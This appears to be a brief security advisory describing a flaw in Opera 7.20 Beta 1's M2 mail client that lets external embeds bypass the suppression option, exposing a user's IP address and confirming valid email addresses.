The Opera M2 Mail Client is vulnerable to a policy circumvention issue that could allow information to be disclosed to a remote attacker. It is possible for an attacker to bypass the option to suppress the viewing of external embeds. This could allow the attacker to learn the IP address of a vulnerable user and to determine if an e-mail address is valid.

This vulnerability was reported to only affect Opera 7.20 Beta 1 build 2981.
